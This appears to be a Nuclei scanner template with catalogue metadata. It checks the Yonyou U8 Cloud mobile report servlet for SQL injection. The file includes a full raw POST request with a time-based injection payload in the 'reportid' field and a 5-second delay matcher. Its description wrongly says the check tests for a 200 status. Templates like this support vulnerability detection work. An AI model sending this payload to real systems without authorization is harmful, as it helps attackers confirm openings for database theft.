script_name: 用友U8 Cloud移动报表mobilereport接口SQL注入漏洞
content:
# Add your nuclei formatted PoC!
id: yonyou-u8-mobile-report-sql-injection-simple

info:
  name: Yonyou U8 Mobile Report SQL Injection Simple Check
  author: chobits02
  severity: high
  description: |
    A simplified template to detect potential SQL Injection vulnerability in Yonyou U8 mobile report query by checking if the server returns a 200 status code.

requests:
  - raw:
      - |
        POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.ReportDetailDataQuery HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/json
        Accept-Encoding: gzip
        Connection: close

        {"reportid":"';WAITFOR DELAY '0:0:5'--"}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
help: 用友u8 cloud存在SQL注入漏洞，攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。
author: 星之彩
tags: OA,用友U8 Cloud,协同办公套件,用友
online_script_name: 用友U8 Cloud移动报表mobilereport接口SQL注入漏洞
